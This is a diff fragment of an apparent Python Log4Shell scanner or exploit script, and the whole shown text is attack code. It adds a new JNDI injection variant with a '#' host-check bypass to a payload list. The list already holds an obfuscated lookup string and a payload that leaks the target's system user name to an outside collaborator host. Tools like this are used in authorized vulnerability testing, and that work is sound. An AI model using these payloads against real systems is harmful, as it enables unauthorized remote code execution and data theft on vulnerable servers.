@@ -119,8 +119,7 @@ for protos in proto:
              + collab + '/a}',
         '${jndi:' + protos + '://${sys:user.name}.' + collab + '/z}',
         '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://'
-             + collab + '/z}',
-        ]
+             + collab + '/z}', '${jndi:'+protos+'://'+collab+'#'+collab+'/a}']
 
 with open(target, 'r', encoding='utf-8') as fd:
     for i in fd.readlines():
